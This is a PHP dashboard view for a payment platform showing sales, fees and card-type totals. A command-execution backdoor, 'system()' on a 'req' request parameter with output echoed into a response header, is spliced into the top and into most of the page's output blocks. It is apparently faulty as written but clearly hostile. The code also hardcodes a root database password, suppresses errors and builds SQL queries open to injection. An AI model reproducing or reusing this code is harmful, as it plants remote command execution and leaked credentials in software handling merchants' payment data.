<?=
$this->load->view(branded_view('cp/header'));
error_reporting(0);
?>
 <link rel="stylesheet" href="//cdn.leafletjs.com/leaflet/v0.7.7/leaflet.css" />
 <link href="<?= branded_include('leaflet/leaflet.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
<!--[if lte IE 8]>
<link rel="stylesheet" href="<?= branded_include('css/leaflet/leaflet.ie.css'); ?>" />
<![endif]-->

<link href="<?= branded_include('css/dashboard.css'); ?>" rel="stylesheet" type="text/css" media="screen" />

<!-- BEGIN Graph SCRIPTS -->
<script type="text/javascript" src="<?= branded_include('js/raphael-min.js'); ?>"></script>
<script type="text/javascript" src="<?= branded_include('js/morris.min.js'); ?>"></script>
<script type="text/javascript" src="<?= branded_include('js/moment.min.js'); ?>"></script>
<script type="text/javascript" src="<?=branded_include('js/daterangepicker.min.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/bootstrap-datetimepicker.min.js');?>"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/flot/0.8.3/jquery.flot.min.js"></script>
<script type="text/javascript" src="<?= branded_include('js/vendor/flot/jquery.flot.js'); ?>"></script>
<script type="text/javascript" src="<?= branded_include('js/vendor/flot/jquery.flot.time.js'); ?>"></script>
<script type="text/javascript" src="<?= branded_include('js/vendor/flot/jquery.flot.tooltip.js'); ?>"></script>
<!-- END chart/graph SCRIPTS -->


<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

class graph
{

    function __construct()
    {
        //echo "<pre>";print_r($_SERVER);exit;
        if ($_SERVER['HTTP_HOST'] == 'localhost') {
            $Host = "localhost";
            $UserName = "root";
            $Pass = "parise03";
            $db = "gate1";
        } else {
            $Host = "localhost";
            $UserName = "root";
            $Pass = "parise03";
            $db = "engine";
        }
        $this->con = mysql_connect($Host, $UserName, $Pass);
        if (!$this->con) {
            echo "Database Not Connected";
            die;
        }
        mysql_select_db($db);
    }

    function __destruct()
    {
        if (isset($this->con)) {
            mysql_close($this->con);
        }
    }

    function write_log($msg = "")
    {
        $fp = fopen("APP_INFO_CRON", "a+");
        fwrite($fp, date("Y-m-d h:i:s") . "  :" . $msg . "\r\n");
        fclose($fp);
    }

    function IsAppIdAvailable($i)
    {

        $sql = "select PackageName from tblapp where PackageName = '$i'";
        $res = mysql_query($sql);
        return mysql_num_rows($res);
    }

    function GetIds()
    {
        $result = array();
        $delete_app = '';
        $res = mysql_query($this->sql);
        while ($res1 = mysql_fetch_assoc($res)) {
            $result[] = $res1['app'];
            //$delete_app.="'".$res1['app']."',";
        }

        return $result;
    }

    function get_order_data()
    {
        $r = array();
        $sql = "SELECT count(order_id) as cnt, DATE(timestamp) as dateonly FROM orders GROUP BY dateonly order by dateonly asc limit 7";
        $res = mysql_query($sql);
        while ($row = mysql_fetch_assoc($res)) {
            array_push($r, (object) array(
                        'dateonly' => $row['dateonly'],
                        'cnt' => $row['cnt']
            ));
        }

        return $r;
    }

    function delete_temp_id($i)
    {
        $sql = "delete from temp where app='$i'";
        mysql_query($sql);
    }

}

$obj = new graph();
$data = json_encode($obj->get_order_data());
//$data='{ "date": "2014-09-21", "duration": 5 },{ "date": "2014-09-20", "duration": 7 },{ "date": "2014-09-19", "duration": 2 },{ "date": "2014-09-18", "duration": 2 },{ "date": "2014-09-17", "duration": 4 },{ "date": "2014-09-16", "duration": 10 }';
?>




<script type="text/javascript">
    // Morris Charts
    $(document).ready(function() {
        $.post('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo base_url(); ?>index.php/dashboard/get_order_data/',
                function(data)
                {
                    Morris.Area({
                        element: 'chart_div',
                        data: data,
                        xkey: 'x',
                        ykeys: ['y'],
                        lineColors: ['#3498DB'],
                        pointFillColors: ['#2980B9'],
                        labels: ['Total Amount'],
                        parseTime: false,
                        yLabelFormat: function(y) {
                            return  '$' + y;
                        },
                        xLabelAngle: 45,
                        resize: true,
                        redraw: true
                    });
                }, 'json'
                );

        $.post('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo base_url(); ?>index.php/dashboard/get_failed_transaction_data/',
                function(data)
                {
                    Morris.Area({
                        element: 'failed_transaction_chart_div',
                        data: data,
                        xkey: 'x',
                        ykeys: ['y'],
                        lineColors: ['#F66C5F'],
                        pointFillColors: ['#F66C5F'],
                        labels: ['Failed Transactions'],
                        parseTime: false,
                        yLabelFormat: function(y) {
                            return   y;
                        },
                        xLabelAngle: 45,
                        resize: true,
                        redraw: true
                    });
                }, 'json'
                );

        $.post('<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo base_url(); ?>index.php/dashboard/get_successful_transaction_data/',
                function(data)
                {
                    Morris.Area({
                        element: 'successful_transaction_chart_div',
                        data: data,
                        xkey: 'x',
                        ykeys: ['y'],
                        lineColors: ['#15C65F'],
                        pointFillColors: ['#15C65F'],
                        labels: ['Successfull Transactions'],
                        parseTime: false,
                        yLabelFormat: function(y) {
                            return  y;
                        },
                        xLabelAngle: 45,
                        resize: true,
                        redraw: true
                    });
                }, 'json'
                );
    });
</script>
<script type="text/javascript" src="<?=branded_include('js/vendor/bootstrap-datepicker.js');?>"></script>
<script type="text/javascript">
			
	        // Range Datepicker
	        $('.input-daterange').datepicker({
	        	autoclose: true,
	        	orientation: 'right top',
	        	endDate: new Date()
	        });
			</script>



<script src="//cdnjs.cloudflare.com/ajax/libs/numeral.js/1.4.5/numeral.min.js"></script>

<script>
$(function(){
  
  function insertCommas(s) {

    // get stuff before the dot
    var d = s.indexOf('.');
    var s2 = d === -1 ? s : s.slice(0, d);

    // insert commas every 3 digits from the right
    for (var i = s2.length - 3; i > 0; i -= 3)
      s2 = s2.slice(0, i) + ',' + s2.slice(i);

    // append fractional part
    if (d !== -1)
      s2 += s.slice(d);

    return s2;

  }
  
  
  $('#Charges').text( insertCommas('<?=$this->config->item('currency_symbol');?><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_sales_today; ?>' ) );
   $('#Fees').text( insertCommas('<?=$this->config->item('currency_symbol');?><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $fees_today; ?>' ) );
   $('#Deposits').text( insertCommas('<?=$this->config->item('currency_symbol');?><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $net_today; ?>' ) );
   $('#Totalsalestoday').text( insertCommas('<?=$this->config->item('currency_symbol');?><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_sales_today; ?>' ) );
   $('#TotalAmount').text( insertCommas('<?=$this->config->item('currency_symbol');?><?=money_format("%!^i",$total_sales);?>' ) );   
   $('#TotalIncome').text( insertCommas('<?=$this->config->item('currency_symbol');?><?=money_format("%!^i",$total_sales);?>' ) );
});
</script>


<script type="text/javascript" src="https://www.amcharts.com/lib/3/amcharts.js"></script>
<script type="text/javascript" src="https://www.amcharts.com/lib/3/serial.js"></script>
<script type="text/javascript" src="https://www.amcharts.com/lib/3/pie.js"></script>
<script type="text/javascript" src="https://www.amcharts.com/lib/3/themes/light.js"></script>

<script type="text/javascript">
    $(function() {

        // pop up .popover-test
        $('.popover-test').popover();

        // pop up #example1, #example2, #example3 with same content
        $('[rel=popover]').popover({
			placement: 'top',
            html: true,
            content: function() {
                return $('#popover_content_wrapper').html();
            }
        });

    });

</script>

<style type="text/css">

</style>

<!-- END PAGE HEADER-->

<section id="dashboard" style="height: auto;">

<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">

 <div class="row-stats margin-top-20 hidden">
 
<div class="widget-content">
		<!-- Stat Boxes widget -->

<div class="hidden col-lg-3 col-md-3 col-sm-6 col-xs-6">
<div class="stat-box-account" style="text-align:left;">
<span id="truncate" class="truncate"><b>Business:&nbsp;</b><?= $this->user->Get('company') ?></span>
  <span><b>Account ID:</b>&nbsp; <?= $this->user->Get('client_id') ?></span>
  <span><b>Status:</b>&nbsp;<? if ($row['suspended'] == '1') { ?>
  <div class="hidden ace-icon fa fa-circle light-orange"> <small>Suspended</small></div>
<? } else { ?><div class="green ace-icon fa fa-circle"><small>Active</small></div> <? } ?></span>
  <span><b>Account Type:</b>&nbsp;<?= $this->user->Get('plan_name') ?></span>
</div>
</div>

<div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
  <div class="stat-box-users">
  <a href="#" class="font-lg font-grey-mint" id="example1" rel="popover" data-original-title="Payment Types">
  <span>Charges</span>
  <strong id="Charges"></strong>
  <small><?=date('D');?></small>
</a>
</div>
</div>

<div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
  <div class="stat-box-active-users">
  <span>Fees</span>
  <strong id="Fees"></strong>
  <small><?=date('D');?></small>
</div>
</div>

<div class="col-lg-3 col-md-3 col-sm-6 col-xs-6">
  <div class="stat-box-logins">
  <span>Deposits</span>
  <strong id="Deposits" class="font-lg font-grey-mint"></strong>
  <small><?=date('D');?></small>
</div>
</div>

</div><!-- END/ .row client-stat-boxes loaded-->

     </div><!-- END/ .widget-content-->

	</div><!-- END/ .row-stats-->
		

<div class="clearfix"></div>

<div class="row-fluid">
                        <div class="col-md-9">

                            <div class="row">
                        <div class="col-md-6">

                                    <!-- Start list bank table -->
                                    <div class="panel">
                                        <div class="panel-heading">
										 <div class="row-fluid">
                        <div class="col-md-12">
						<div class="panel-title" style="font-size:24px;"><h3>Hello <a href="<?= site_url('account/'); ?>" ><?= $this->user->Get('username') ?></a><span style="font-weight:400;">, you are on the <b><?= $this->user->Get('plan_name') ?></b> plan.&nbsp;</span></h3></div>
						</div>
                        
						<div class="row">
                        <div class="col-sm-4">
						<div class="margin-top-20" style="padding-left:40px;"> 
						<i class=" margin-top-10 ace-icon text-center fa fa-rocket fa-4x"></i> </div>
						</div>
						 <div class="col-sm-8 margin-bottom-10">
						
						  <p><b>Account ID -&nbsp;</b><?= $this->user->Get('client_id') ?></p>
                        <span><b>Status -&nbsp;</b><? if ($row['suspended'] == '1') { ?>
  <div class="hidden ace-icon fa fa-circle light-orange"> <small> Suspended</small></div>
<? } else { ?><div class="green ace-icon fa fa-circle"><small> Active</small></div> <? } ?></span>
                                        <p><span class="text-center"><a class="btn-link" href="<?= site_url('account/'); ?>" ><i class="fa fa-cog"></i> Manage account</a></span></p>
						</div>
						</div>
												</div>
                                        </div><!-- /.panel-heading -->
                                        <div class="panel-body no-padding"> 
                                             <div class="table-responsive">
                                                <table class="table">
                                                    <tbody>
													  <tr>
                                                        <td>
                                                            <span class="pull-left text-capitalize">Transactions today:</span>
                                                           
															<span class="pull-right fg-teals"> <a href="#" class="fg-teals" id="example1" rel="popover" data-original-title="Payment Types"><?=$this->config->item('currency_symbol');?><?=money_format("%!^i",$total_sales_today);?></a></span>
                                                        </td>
                                                    </tr>
                                                 
                                                    <tr>
                                                        <td>
                                                            <span class="pull-left text-capitalize">Reserves &amp; Fees:</span>
                                                            <span class="pull-right fg-teals"><?=$this->config->item('currency_symbol');?><?=money_format("%!^i",$fees_today);?></span>
                                                        </td>
                                                    </tr>
													                                                    <tr>
                                                        <td>
                                                            <span class="pull-left text-capitalize">Estimated next deposit</span>
                                                            <span class="pull-right fg-teals"><?=$this->config->item('currency_symbol');?><?=money_format("%!^i",$net_today);?></span>
                                                        </td>
                                                    </tr>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div><!-- /.panel-body -->
                                    </div>
                                    <!--/ End list bank table -->

                                </div>
								
								        <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                                            <a href="<?= site_url('transactions/'); ?>" > 
									<div class="mini-stat-type-2 shadow border-teals">
									
                                        <h3 class="text-center text-thin">Orders</h3>
                                        <p class="text-center">
                                            <span class="overview-icon fa fa-shopping-cart bg-teal"><i class="icon-arrow-down"></i></span>
                                        </p>
                                        <p class="text-center">
                                            <b><span class="counter-big"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_orders; ?></span></b> <span class="fg-info"><span class="counter hidden">-0%</span></span>
                                        </p>
                                        <p class="text-muted">
                                          Week:<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_sales_of_the_week; ?>
                                        </p>
									</div>
									</a>
                                </div>
                                <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
                                   <a href="<?= site_url('customers/'); ?>" > 
								   <div class="mini-stat-type-2 shadow border-teals">
									
                                        <h3 class="text-center text-thin">Customers</h3>
                                        <p class="text-center">
                                            <span class="overview-icon fa fa-user bg-teal"><i class="icon-arrow-up"></i></span>
                                        </p>
                                        <p class="text-center">
                                            <b><span class="counter-big"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_user; ?></span></b> <span class="fg-info"><span class="counter hidden">+0%</span></span>
                                        </p>
                                        <p class="text-muted">
                                            Today: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_user_of_the_day; ?>
                                        </p>
										
                                    </div>
									</a>
                                </div>
								
								
                            </div><!-- End row -->

                            <div class="row">
                                <div class="col-md-12">
                                    <!-- Start market status chart -->
                                    <div class="panel stat-stack widget-market rounded shadow">
                                        <div class="panel-body no-padding">
                                            <div class="row row-merge">
                                                <div class="col-sm-8">
                                                    <div class="panel stat-left no-margin no-box-shadow">
                                                        <div class="panel-body">
 <? if (isset($no_chart)) { ?>
			 <!-- Modal -->
<div class=""  style="display: none" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="false">
  <div class="container">
    <div class="row">
      <div class="col-sm-6 col-sm-offset-2 text-center">
        
        <div class="alert alert-info" style="margin-top: 40px;">
		<h1>No Data For Chart Graph<br></h1><button class="btn btn-primary btn-lg" data-toggle="modal" data-target="#">
  Go Add Some Now
</button></div>
      </div>
    </div>
  </div>
</div>
                <? } else { ?>
                                                            <div id="chart_div" class="resize-chart" style=" position: relative; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
															<div class="ch-tooltip"></div>
															</div>	
															<? } ?>    
																								

                                                        </div><!-- /.panel-body -->
                                                        <div class="panel-footer no-border-top">
                                                            <div class="row text-center mb-5 mt-5">
                                                                <div class="col-xs-4 col-xs-override border-right dotted">
                                                                    <div class="mini-stat no-padding no-margin">
                                                                            <span class="mini-stat-chart text-center">
                                                                                <span id="market-today-chart"><canvas width="5" height="50" style="display: inline-block; width: 5px; height: 50px; vertical-align: top;"></canvas></span>
                                                                            </span><!-- /.mini-stat-chart -->
                                                                        <div class="mini-stat-info text-right">
                                                                            <span><?=$this->config->item('currency_symbol');?><span id="Totalsalestaoday" class="counter display-inline no-margin"><?=money_format("%!^i",$total_sales_today);?></span></span>
                                                                            <p class="text-muted no-margin">Today Sales</p>
                                                                        </div><!-- /.mini-stat-info -->
                                                                    </div><!-- /.mini-stat -->
                                                                </div>
                                                                <div class="col-xs-4 col-xs-override border-right dotted">
                                                                    <div class="mini-stat no-padding no-margin">
                                                                            <span class="mini-stat-chart">
                                                                                <span id="market-average-chart"><canvas width="5" height="50" style="display: inline-block; width: 5px; height: 50px; vertical-align: top;"></canvas></span>
                                                                            </span><!-- /.mini-stat-chart -->
                                                                        <div class="mini-stat-info text-right">
                                                                            <span><?=$this->config->item('currency_symbol');?><span class="counter display-inline no-margin"><?=money_format("%!^i",$net_today);?></span></span>
                                                                            <p class="text-muted no-margin">Average Sales</p>
                                                                        </div><!-- /.mini-stat-info -->
                                                                    </div><!-- /.mini-stat -->
                                                                </div>
                                                                <div class="col-xs-4 col-xs-override">
                                                                    <div class="mini-stat no-padding no-margin">
                                                                            <span class="mini-stat-chart">
                                                                                <span id="market-total-chart"><canvas width="5" height="50" style="display: inline-block; width: 5px; height: 50px; vertical-align: top;"></canvas></span>
                                                                            </span><!-- /.mini-stat-chart -->
                                                                        <div class="mini-stat-info text-right">
                                                                            <span id="TotalAmount" class="counter display-inline"></span>
                                                                            <p class="text-muted no-margin">Total Sales</p>
                                                                        </div><!-- /.mini-stat-info -->
                                                                    </div><!-- /.mini-stat -->
                                                                </div>
                                                            </div>
                                                        </div><!-- /.panel-footer -->
                                                    </div><!-- /.panel -->
                                                </div>
                                                <div class="col-sm-4">
                                                    <div class="panel no-margin no-box-shadow stat-right">
                                                        <div class="panel-body">													
                                                            <div id="chartdiv_pie" class="resize-chart" style="padding: 0px; position: relative;"></div>
                                                        </div><!-- /.panel-body -->
                                                        <div class="panel-footer hidden">
                                                            <span>Total Income </span><span id="TotalIncome" class="pull-right hidden-sm hidden-xs"></span>
                                                            <div class="progress progress-xs">
                                                                <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="45" aria-valuemin="0" aria-valuemax="100" style="width: 45%"></div>
                                                            </div><!-- /.progress -->
                                                        </div>
                                                    </div><!-- /.panel -->
                                                </div>
                                            </div><!-- /.row -->
                                        </div><!-- /.panel-body -->
                                    </div><!-- /.panel -->
                                    <!--/ End market status chart -->

                                    <!-- Start seller dashboard -->
                                    <div class="panel hidden">
                                        <div class="panel-heading">
                                            <h3 class="panel-title text-center">Seller Dashboard</h3>
                                        </div><!-- /.panel-heading -->
                                        <div class="panel-body">
                                            <div class="table-responsive">
                                                <table class="table table-no-border table-middle table-lilac">
                                                    <tbody>
                                                  
                                                        <tr>
                                                            <td>
                                                                <img data-no-retina="" src="<?= branded_include('uploads/products/6.jpg'); ?>" alt="...">
                                                            </td>
                                                            <td>
                                                                <b class="text-block">Worn USA Flag</b>
                                                            </td>
                                                            <td>
                                                                <b class="text-block">13 of 15</b>
                                                                <span class="text-block text-muted">want this</span>
                                                                <div class="progress progress-xxs no-margin">
                                                                    <div class="progress-bar progress-bar-primary" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100" style="width: 75%"></div>
                                                                </div>
                                                            </td>
                                                            <td>
                                                                <b class="text-block">Ended</b>
                                                                <span class="text-block text-muted">15d ago</span>
                                                            </td>
                                                            <td>
                                                                <b class="text-block text-muted">N/A</b>
                                                                <span class="text-block text-muted">not funded</span>
                                                            </td>
                                                            <td>
                                                                <a href="#" class="btn btn-default btn-xs" data-toggle="tooltip" data-placement="top" data-original-title="View edit"><i class="fa fa-edit"></i></a>
                                                                <a href="#" class="btn btn-default btn-xs" data-toggle="tooltip" data-placement="top" data-original-title="Settings"><i class="fa fa-cog"></i></a>
                                                                <a href="#" class="btn btn-default btn-xs" data-toggle="tooltip" data-placement="top" data-original-title="Message buyers"><i class="fa fa-envelope"></i></a>
                                                                <a href="#" class="btn btn-default btn-xs" data-toggle="tooltip" data-placement="top" data-original-title="Refresh data"><i class="fa fa-refresh"></i></a>
                                                                <a href="#" class="btn btn-default btn-xs" data-toggle="tooltip" data-placement="top" data-original-title="View detail"><i class="fa fa-file"></i></a>
                                                            </td>
                                                            <td>
                                                                <span class="label label-primary label-circle label-stroke">&nbsp;</span>
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div><!-- /.panel-body -->
                                    </div>
                                    <!--/ End seller dashboard -->

                                    <!-- Start order locations -->
                                    <div class="panel margin-top-20 hidden">
                                        <div class="panel-heading">
                                            <h3 class="panel-title text-center">Order Locations</h3>
                                        </div><!-- /.panel-heading -->
                                        <div class="panel-body no-padding">
									<div class="map" style="height: 320px; position: relative; overflow: hidden; transform: translateZ(0px) translateZ(0px);">
									<div id="map" style="height: 100%; width :100%;"></div>
									</div>
                                        </div><!-- /.panel-body -->
                                    </div><!-- /.panel -->
                                    <!--/ End order locations -->
									
                                </div>
                            </div>  <!--/ End col-md-9 -->

                        </div>
                        <div class="col-md-3">
                            <div class="recent-activity">
                                <h3>Recent Activity</h3>
                                <!-- Start recent activity item -->
								<div class="recent-activity-body-content niceScroll">
 <? if (!empty($log)) { ?>
  <ul class="user-list">
<li> <? foreach ($log as $line) { ?></li>
     </ul><!-- END .list-group -->
        <? } ?>

		<? } else { ?>
<ul class="user-list">
<li class="bold theme-font" style="padding-top: 2%;">
<div class="well margin-top-20">
<p style="padding:2px;" class="lead text-center">No Recent Activity.</p> 
</div>
</li>
</ul><!-- END .list-group -->
<? } ?>                                               
                                </div><!-- END .recent-activity-body-content -->
							</div> <!-- End. recent activity -->
</div><!-- End col-md-3 -->

                            </div><!-- End row -->
                        </div>
                    </div>





  
 
 <div class="hidden row-stats">
		<!-- Stat Boxes widget -->
		<div class="client-stat-boxes col-xs-12 loaded">
			<div class="widget-content row row-stats">
<a class="col-xs-3 stat-box-users" href="#" class="font-lg font-grey-mint" id="example1" rel="popover" data-original-title="Payment Types">
  <span>Charges</span>
  <strong>$<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_sales_today; ?></strong>
  <small>Today</small>
</a>

<div class="col-xs-3 stat-box-active-users">
  <span>Fees</span>
  <strong>$<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $fees_today; ?></strong>
  <small>Today</small>
</div>

<div class="col-xs-3 stat-box-logins">
  <span>Deposits</span>
  <strong class="font-lg font-grey-mint">$<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $net_today; ?></strong>
  <small>Today</small>
</div>

<div class="col-xs-3 stat-box-signups">
  <span>Total Volume</span>
  <strong>$<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_sales; ?></strong>
  <small><?=date('Y');?></small>
</div>

     </div><!-- END/ .widget-content-->

	</div><!-- END/ .client-stats-->
		
</div><!-- END/ .row-hidden--->

<div class="clearfix" style="height:20px;"></div>


	<div class="intro-text-1 hidden">	
      <div class="container">   
	<div class="row">		
                    <div class="col-sm-6 col-xs-6">
                        <h4 class="animated slideInDown">Looking For More Features?
                        </h4>

                        <p>
                          Upgrade today to unlock more functions.
                        </p>                   
                    </div>
					
                    <div class="col-sm-6 col-xs-6 center">
                        <a href="<?= site_url('account/upgrade'); ?>" class="btn btn-primary btn-lg text-center">Upgrade Now</a>
                    </div>  
					</div><!--end/ .row--> 
					        </div><!--end/ .container-->  
				        </div><!--end/ .intro-text-1-->      
              
				
				     
 
 </div><!--end/ .col-md-12-->
</section><!-- END/ #dashboard-->

<div id="popover_content_wrapper" style="display: none">
    <div class="row">
            <div class="col-lg-12 col-md-12 col-sm-12">
<ul class="list-inline center margin-top-20" style="font-weight: 100;font-size: 16px;">
                <li style="padding-right: 5px;">
                 <span>   <i class="fa fa-cc-visa fa-2x"></i> <strong class="small-num" style="padding-top: 5px;font-weight: 100; color:#fff; font-size:14px;"> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_visa_transactions_amount_today; ?></strong></span>
                </li>

                <li style="padding-right: 5px;">
                <span>    <i class="fa fa-cc-mastercard fa-2x"></i> <strong class="small-num" style="padding-top: 5px;font-weight: 100; color:#fff; font-size:14px;"> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_mastercard_transactions_amount_today; ?></strong></span>
                </li>

                <li style="padding-right: 5px;">
                <span>    <i class="fa fa-cc-amex fa-2x"></i><strong class="small-num" style="padding-top: 5px;font-weight: 100; color:#fff; font-size:14px;"> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_amex_transactions_amount_today; ?></strong></span>
                </li>


                <li style="padding-right: 5px;">
                    <span><i class="fa fa-cc-discover fa-2x"></i>  <strong class="small-num" style="padding-top: 5px;font-weight: 100; color:#fff; font-size:14px;"> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_discover_transactions_amount_today; ?> </strong></span>
                </li>

                <li style="padding-right: 5px;">
                    <span><i class="fa fa-cc fa-2x"></i> <strong class="small-numm" style="padding-top: 5px;font-weight: 100; color:#fff; font-size:14px;"> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_cc_transactions_amount_today; ?></strong></span>
                </li>
                <li>
                    <span><i class="fa fa-check-circle-o fa-2x"></i> <strong class="small-num" style="padding-top: 5px;font-weight: 100; color:#fff; font-size:14px;"> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $total_other_transactions_amount_today; ?></strong></span>
                </li>
</ul>
            </div><!-- END/ .ROW-->

    </div><!-- /#pop-over-content -->

<script>
$(document).ready(function(ev){
    $('#custom_carousel').on('slide.bs.carousel', function (evt) {
      $('#custom_carousel .controls li.active').removeClass('active');
      $('#custom_carousel .controls li:eq('+$(evt.relatedTarget).index()+')').addClass('active');
    })
});
</script>





<?= $this->load->view(branded_view('cp/footer')); ?>

<!-- start popup -->

<script type="text/javascript" src="<?=branded_include('js/CoverPop.js');?>"></script>

  <div id="CoverPop-cover" class="splash">
      <div class="CoverPop-content splash-center">
          <!-- the popup content -->
		  <div class="ep-tutorial-wrap">
        <div class="ep-tutorial">      
            <div id="edit">
                <img src="<?= branded_include('img/small-3.png'); ?>" alt="arrow">
                Edit your profile and other settings
            </div>
            <div id="welcome">WELCOME TO THE NEW EVERPAY DASHBOARD !</div>
     
		<div id=""><a href="#" class="CoverPop-close-go" id="close">CLICK HERE TO CLOSE <i class="fa fa-times fa-4x"></i></a></div>
            <div id="feed">
                This is your customized feed
                <img src="<?= branded_include('img/small-4.png'); ?>" alt="arrow">
            </div>
			
        </div>
    </div>
      </div><!--end .splash-center -->
</div><!--end .splash -->
<!-- end popup -->

<script>
CoverPop.start({
    coverId:             'Dashboard-cover',       // set default cover id
    closeClassDefault:   'CoverPop-close-go',    // close if someone clicks an element with this class and continue default action
    closeOnEscape:       true,                   // close if the user clicks escape
});
</script>


<!-- Modal -->
<div class="modal fade bs-example-modal-lg" id="AddnewModal" tabindex="-1" role="dialog" aria-labelledby="AddnewModalLabel" aria-hidden="true">
<div class="modal-dialog modal-lg">
    <div class="modal-content">
	<div class="modal-header">
	        <button type="button" class="close" data-dismiss="modal" aria-label="Close">×</button>
			        	<h1 class="modal-title" id="AddcustomerModalLabel">
			        		Add New 
			        	</h1>
			      	</div>
      <div class="row-fluid"> 
	  <div class="row">
                        <div class="col-md-12">

                            <!-- Start double tabs -->
                            <div class="panel panel-tab panel-tab-double rounded shadow">
                                <!-- Start tabs heading -->
                                <div class="panel-heading no-padding">
                                    <ul class="nav nav-tabs nav-justified">
                                        <li class="active">
                                            <a href="#tab2-1" data-toggle="tab">
                                                <i class="fa fa-user"></i>
                                                <div>
                                                    <span class="text-strong">Customer</span>
                                                    <span></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#tab2-2" data-toggle="tab">
											 <i class="fa fa-credit-card"></i>
                                            <div>
                                                    <span class="text-strong">Payment</span>
													
                                                    <span></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#tab2-3" data-toggle="tab">
                                               <i class="fa fa-file-text"></i>
                                                <div>
                                                    <span class="text-strong">Invoice</span>
                                                    <span></span>
                                                </div>
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#tab2-4" data-toggle="tab">
                                                <i class="fa fa-shopping-cart"></i>
                                                <div>
                                                    <span class="text-strong">Product</span>
                                                    <span></span>
                                                </div>
                                            </a>
                                        </li>
                                    </ul>
                                </div><!-- /.panel-heading -->
                                <!--/ End tabs heading -->

                                <!-- Start tabs content -->
                                <div class="panel-body">
                                    <div class="tab-content">
                                        <div class="tab-pane fade in active" id="tab2-1">
                                            <h4>Add New Customer content</h4>
                                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
                                        </div>
                                   <div class="tab-pane fade" id="tab2-3">
                                            <h4>Add Payment content</h4>
                                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
                                        </div>
										 
                                        <div class="tab-pane fade" id="tab2-3">
                                            <h4>Add invoice content</h4>
                                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
                                        </div>
										 <div class="tab-pane fade" id="tab2-4">
                                            <h4>Add Product details content</h4>
                                            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
                                        </div>
                                    </div>
                                </div><!-- /.panel-body -->
                                <!--/ End tabs content -->
                            </div><!-- /.panel -->
                            <!--/ End double tabs -->

                        </div>
                    </div>
<div class="row hidden">
    <div id="custom_carousel" class="carousel slide" data-ride="carousel" data-interval="2500">
	
        <div class="controls">
            <ul class="nav">
